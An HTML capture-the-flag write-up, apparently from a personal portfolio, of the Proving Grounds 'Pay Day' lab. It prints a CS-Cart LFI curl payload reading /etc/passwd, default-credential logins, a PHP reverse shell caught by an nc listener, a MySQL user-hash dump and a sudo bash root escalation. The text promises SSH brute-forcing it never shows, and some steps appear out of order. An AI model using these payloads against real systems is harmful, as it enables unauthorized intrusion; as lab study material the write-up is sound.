@@ -1,0 +1,265 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="In this lab, Learners exploit a Local File Inclusion (LFI) vulnerability in the CS-Cart application to access sensitive system files and uncover critical usernames. Using the retrieved information, Learners will brute-force SSH credentials to gain access to the system and escalate privileges to root using a sudo misconfiguration. This exercise enhances skills in web application exploitation, brute-forcing, and privilege escalation."><title>Proving Grounds: Pay Day</title><style>
+  :root { --muted:#9aa4b2; --accent:#facc15; --text:#e6eef6; --mono:ui-monospace,SFMono-Regular,Menlo,Monaco,"Roboto Mono","Courier New",monospace; --maxw:900px; }
+  * { box-sizing:border-box; } html { scroll-behavior:smooth; }
+  body { margin:0; background:linear-gradient(180deg,#071021 0%,#0f1724 50%); color:var(--text); font-family:Inter,"Segoe UI",Roboto,system-ui,-apple-system,sans-serif; -webkit-font-smoothing:antialiased; line-height:1.6; }
+  .wrap { max-width:var(--maxw); margin:40px auto; padding:28px; background:linear-gradient(180deg,rgba(255,255,255,.02),rgba(255,255,255,.01)); border:1px solid rgba(255,255,255,.03); border-radius:12px; box-shadow:0 6px 30px rgba(2,6,23,.6); }
+  .site-header { display:flex; align-items:center; justify-content:space-between; gap:16px; padding-bottom:18px; margin-bottom:24px; border-bottom:1px solid rgba(255,255,255,.06); }
+  .site-brand { color:var(--accent); font-weight:750; letter-spacing:.02em; text-decoration:none; } .site-brand:hover,.site-link:hover { color:#ffe57a; } .site-link { color:var(--muted); font-size:13px; text-decoration:none; } .back-button { padding:7px 11px; border:1px solid rgba(250,204,21,.24); border-radius:7px; background:rgba(250,204,21,.08); color:var(--accent); font-weight:650; }
+  .target-tag { display:inline-block; margin-bottom:12px; padding:5px 10px; border:1px solid rgba(250,204,21,.24); border-radius:999px; color:var(--accent); background:rgba(250,204,21,.1); font-size:12px; font-weight:700; letter-spacing:.08em; text-transform:uppercase; }
+  header h1 { margin:0; font-size:28px; letter-spacing:-.2px; line-height:1.25; } header p { margin:8px 0 0; color:var(--muted); font-size:14px; }
+  .meta { display:flex; flex-wrap:wrap; gap:12px; align-items:center; margin-top:18px; color:var(--muted); font-size:13px; } .badge { background:rgba(250,204,21,.12); color:var(--accent); padding:6px 10px; border-radius:999px; font-weight:600; font-size:13px; }
+  nav.toc { margin-top:22px; padding:14px; background:rgba(255,255,255,.02); border:1px solid rgba(255,255,255,.02); border-radius:8px; } nav.toc ul { display:flex; flex-wrap:wrap; gap:10px; margin:0; padding:0; list-style:none; } nav.toc a { color:var(--muted); text-decoration:none; font-size:13px; } nav.toc a:hover { color:var(--accent); }
+  article { margin-top:28px; } h2 { margin-top:30px; color:var(--accent); font-size:22px; scroll-margin-top:20px; } h3 { margin-top:22px; color:#dfe9f6; font-size:17px; } h4,h5,h6 { color:#dfe9f6; } p,li { overflow-wrap:anywhere; } a { color:var(--accent); } strong { color:#f4f8fc; }
+  blockquote { margin:16px 0; padding:10px 12px; color:var(--muted); background:rgba(250,204,21,.06); border-left:3px solid rgba(250,204,21,.22); border-radius:4px; }
+  .code-brief { margin:18px 0 8px; color:var(--muted); font-size:14px; }
+  pre { margin:12px 0; padding:14px; overflow:auto; color:#dff3ff; background:#041022; border:1px solid rgba(255,255,255,.03); border-radius:8px; box-shadow:0 6px 18px rgba(2,6,23,.5); font:13px/1.55 var(--mono); } code { padding:2px 6px; border-radius:4px; background:rgba(255,255,255,.04); font-family:var(--mono); font-size:.9em; } pre code { padding:0; background:transparent; font-size:inherit; }
+  table { width:100%; margin-top:12px; border-collapse:collapse; } th,td { padding:8px; border-bottom:1px solid rgba(255,255,255,.06); text-align:left; color:var(--muted); font-size:14px; } th { color:#dfe9f6; font-weight:600; } hr { border:0; border-top:1px solid rgba(255,255,255,.08); margin:28px 0; } img { max-width:100%; border-radius:8px; }
+  footer { margin-top:30px; padding-top:12px; border-top:1px solid rgba(255,255,255,.02); color:var(--muted); font-size:13px; text-align:center; }
+  @media (max-width:720px) { .wrap { margin:18px; padding:16px; } header h1 { font-size:20px; } nav.toc ul { flex-direction:column; gap:6px; } }
+</style></head><body><main class="wrap"><div class="site-header"><a class="site-brand" href="index.html">Karan Tank</a><a class="site-link back-button" href="index.html">← Back to index</a></div><header><span class="target-tag">Target: Linux</span><h1>Proving Grounds: Pay Day</h1><p>In this lab, Learners exploit a Local File Inclusion (LFI) vulnerability in the CS-Cart application to access sensitive system files and uncover critical usernames. Using the retrieved information, Learners will brute-force SSH credentials to gain access to the system and escalate privileges to root using a sudo misconfiguration. This exercise enhances skills in web application exploitation, brute-forcing, and privilege escalation.</p><div class="meta"><span class="badge">Proving Grounds</span><span>Authorized lab writeup</span><span>Cybersecurity portfolio</span></div></header><nav class="toc" aria-label="Table of contents"><ul><li><a href="#overview">Overview</a></li><li><a href="#learning-objectives">Learning objectives</a></li><li><a href="#scenario">Scenario</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#initial-access">Initial Access</a></li><li><a href="#privilege-escalation">Privilege Escalation</a></li><li><a href="#takeaways">Takeaways</a></li></ul></nav><article><blockquote>
+<p><strong>Authorized-lab note:</strong> This writeup documents activity performed exclusively in an authorized Offensive Security Proving Grounds lab. It is shared for educational and portfolio purposes.</p>
+</blockquote>
+<h2 id="overview">Overview</h2>
+<p>In this lab, you will exploit a Local File Inclusion (LFI) vulnerability in an outdated version of CS Cart installed on the PayDay lab. This lab enhances your skills in vulnerability detection, exploitation, and system access techniques.</p>
+<h2 id="learning-objectives">Learning objectives</h2>
+<p><strong>After completion of this lab, learners will be able to:</strong></p>
+<ul>
+<li>Enumerate the target system and identify services and versions.</li>
+<li>Exploit the CS-Cart LFI vulnerability to extract sensitive files, such as /etc/passwd.</li>
+<li>Leverage the information to perform a brute-force attack on the SSH service.</li>
+<li>Gain system access using valid credentials and identify privilege escalation opportunities.</li>
+<li>Exploit sudo misconfigurations to escalate privileges to root.</li>
+</ul>
+<h2 id="scenario">Scenario</h2>
+<p>In this lab, Learners exploit a Local File Inclusion (LFI) vulnerability in the CS-Cart application to access sensitive system files and uncover critical usernames. Using the retrieved information, Learners will brute-force SSH credentials to gain access to the system and escalate privileges to root using a sudo misconfiguration. This exercise enhances skills in web application exploitation, brute-forcing, and privilege escalation.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>──(.myenv)─(kali㉿kali)-[~/offsec/PayDay]
+# Discover application paths and files that may expand the attack surface.
+
+└─$ gobuster dir -u http://192.168.185.39/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+# Discover application paths and files that may expand the attack surface.
+
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.185.39/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+images               (Status: 301) [Size: 335] [--&gt; http://192.168.185.39/images/]
+index                (Status: 200) [Size: 28074]
+image                (Status: 200) [Size: 1971]
+catalog              (Status: 301) [Size: 336] [--&gt; http://192.168.185.39/catalog/]
+admin                (Status: 200) [Size: 9483]
+skins                (Status: 301) [Size: 334] [--&gt; http://192.168.185.39/skins/]
+core                 (Status: 301) [Size: 333] [--&gt; http://192.168.185.39/core/]
+install              (Status: 200) [Size: 7731]
+include              (Status: 301) [Size: 336] [--&gt; http://192.168.185.39/include/]
+classes              (Status: 301) [Size: 336] [--&gt; http://192.168.185.39/classes/]
+config               (Status: 200) [Size: 13]
+chart                (Status: 200) [Size: 0]
+addons               (Status: 301) [Size: 335] [--&gt; http://192.168.185.39/addons/]
+var                  (Status: 301) [Size: 332] [--&gt; http://192.168.185.39/var/]
+payments             (Status: 301) [Size: 337] [--&gt; http://192.168.185.39/payments/]
+init                 (Status: 200) [Size: 13]
+prepare              (Status: 200) [Size: 0]
+Progress: 27907 / 220559 (12.65%)^C</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+└─$ cp ../banzai/php-reverse-shell/php-reverse-shell.php .</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>┌──(.myenv)─(kali㉿kali)-[~/offsec/PayDay]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ vim php-reverse-shell.php</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>┌──(.myenv)─(kali㉿kali)-[~/offsec/PayDay]
+# Inspect the directory for files relevant to the next step.
+
+└─$ ls
+shell.phtml</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Run the helper or analysis script used in this lab step.
+
+$ python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+# Execute the next evidence-gathering step in the authorized lab.
+
+www-data@payday:/$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output contains credential-related evidence recovered during the lab.
+
+SELECT * FROM cscart_users
+    -&gt; ;
+;
++---------+--------+-----------+------------+--------------+----------+-------------------+---------------+---------+------------+------------+----------------------------------+-----------+-----------+-------------+-------------+-----------+-------+-----------+----------+--------------+--------------------------+-----------+------+------+-----------+
+| user_id | active | user_type | user_login | cart_content | wishlist | membership_status | membership_id | referer | last_login | timestamp  | password                         | card_name | card_type | card_number | card_expire | card_cvv2 | title | firstname | lastname | company      | email                    | phone     | fax  | url  | lang_code |
++---------+--------+-----------+------------+--------------+----------+-------------------+---------------+---------+------------+------------+----------------------------------+-----------+-----------+-------------+-------------+-----------+-------+-----------+----------+--------------+--------------------------+-----------+------+------+-----------+
+|       1 | Y      | A         | admin      |              |          | P                 |             3 |         | 1782609154 | 1112556008 | 21232f297a57a5a743894a0e4a801fc3 |           |           |             |             |           | mr    | Admin     | Admin    | Your company | admin@yourcomany.com     | 555-55-55 | test | test | EN        | 
+|       3 | Y      | C         | customer   |              |          | P                 |             0 |         | 1139039079 | 1116709280 | 91ec1f9324753048c0096d036a694f86 |           |           |             |             |           | mr    | Customer  | Customer |              | customer@somecompany.com | 777-77-77 |      |      | EN        | 
++---------+--------+-----------+------------+--------------+----------+-------------------+---------------+---------+------------+------------+----------------------------------+-----------+-----------+-------------+-------------+-----------+-------+-----------+----------+--------------+--------------------------+-----------+------+------+-----------+
+2 rows in set (0.00 sec)</code></pre><ul>
+<li>We logged into mysql with user root and password root</li>
+<li>Checking out the databases we find the admin&#39;s password is admin and customer&#39;s password is customer</li>
+<li>So trying su patrick with password patrick and it worked</li>
+</ul>
+<h2 id="initial-access">Initial Access</h2>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>┌──(kali㉿kali)-[~/offsec/PayDay]
+# Map exposed services and versions on the target.
+
+└─$ nmap -sCV -p- 192.168.185.39             
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-27 21:07 -0400
+Nmap scan report for 192.168.185.39
+Host is up (0.024s latency).
+Not shown: 65527 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)
+|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)
+80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
+|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
+|_http-title: CS-Cart. Powerful PHP shopping cart software
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: UIDL PIPELINING SASL RESP-CODES TOP CAPA STLS
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_WITH_MD5
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+|_ssl-date: 2026-06-28T01:07:57+00:00; +7s from scanner time.
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
+143/tcp open  imap        Dovecot imapd
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_WITH_MD5
+|_imap-capabilities: CHILDREN UNSELECT IMAP4rev1 completed OK IDLE LOGINDISABLEDA0001 Capability STARTTLS LOGIN-REFERRALS NAMESPACE LITERAL+ SASL-IR THREAD=REFERENCES SORT MULTIAPPEND
+|_ssl-date: 2026-06-28T01:07:57+00:00; +7s from scanner time.
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
+993/tcp open  ssl/imap    Dovecot imapd
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_WITH_MD5
+|_imap-capabilities: CHILDREN UNSELECT IMAP4rev1 OK IDLE completed Capability AUTH=PLAINA0001 LOGIN-REFERRALS NAMESPACE LITERAL+ SASL-IR THREAD=REFERENCES SORT MULTIAPPEND
+|_ssl-date: 2026-06-28T01:07:56+00:00; +7s from scanner time.
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+995/tcp open  ssl/pop3    Dovecot pop3d
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+|_ssl-date: 2026-06-28T01:07:56+00:00; +7s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_WITH_MD5
+|_pop3-capabilities: UIDL PIPELINING SASL(PLAIN) RESP-CODES TOP CAPA USER
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: PAYDAY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.26a)
+|   Computer name: payday
+|   NetBIOS computer name: 
+|   Domain name: 
+|   FQDN: payday
+|_  System time: 2026-06-27T21:07:54-04:00
+|_smb2-time: Protocol negotiation failed (SMB2)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 40m06s, deviation: 1h37m58s, median: 6s</code></pre><ul>
+<li><p>We find a login page on port 80 at <code>http://192.168.185.39/admin.php</code></p>
+</li>
+<li><p>Default password <code>admin:admin</code> works</p>
+</li>
+<li><p>As per this link here <code>https://www.exploit-db.com/exploits/48890</code> there is a LFI and using the payload we can see the files</p>
+</li>
+</ul>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># Retrieve and inspect the web response from the target.
+
+└─$ curl http://192.168.185.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00 | grep &quot;/bin/bash&quot;
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100   1257 100   1257   0      0  29674      0                              0
+root:x:0:0:root:/root:/bin/bash
+patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
+**</code></pre><ul>
+<li>We find the user patrick and root</li>
+<li>As per the other link we found <code>https://gist.github.com/momenbasel/ccb91523f86714edb96c871d4cf1d05c</code>, we can upload a phtml file in the template editor and get a reverse shell</li>
+</ul>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>┌──(.myenv)─(kali㉿kali)-[~/offsec/PayDay]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ rlwrap nc -nlvp 22                    
+listening on [any] 22 ...
+connect to [192.168.45.210] from (UNKNOWN) [192.168.185.39] 46649
+Linux payday 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
+ 21:28:51 up 24 min,  0 users,  load average: 0.05, 0.02, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: can\&#39;t access tty; job control turned off</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code>su patrick
+Password: patrick
+
+# Execute the next evidence-gathering step in the authorized lab.
+
+patrick@payday:/tmp$ id
+id
+uid=1000(patrick) gid=1000(patrick) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),115(lpadmin),1000(patrick)
+# Identify commands that can run with elevated privileges.
+
+patrick@payday:/tmp$ sudo -l
+# Identify commands that can run with elevated privileges.
+
+sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for patrick:patrick
+
+User patrick may run the following commands on this host:
+    (ALL) ALL</code></pre><p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+patrick@payday:/tmp$ sudo /bin/bash -p
+# Execute the next evidence-gathering step in the authorized lab.
+
+sudo /bin/bash -p</code></pre><p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># The output confirms the effective user and privilege level of the current session.
+
+root@payday:/tmp# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@payday:/tmp#</code></pre><h2 id="takeaways">Takeaways</h2>
+<p>This lab reinforced the value of methodical enumeration, evidence-driven hypothesis testing, and validating each access-control boundary in an authorized environment.</p>
+</article><footer>Written by Karan Tank · Documented for educational and portfolio purposes in an authorized lab environment.</footer></main></body></html>
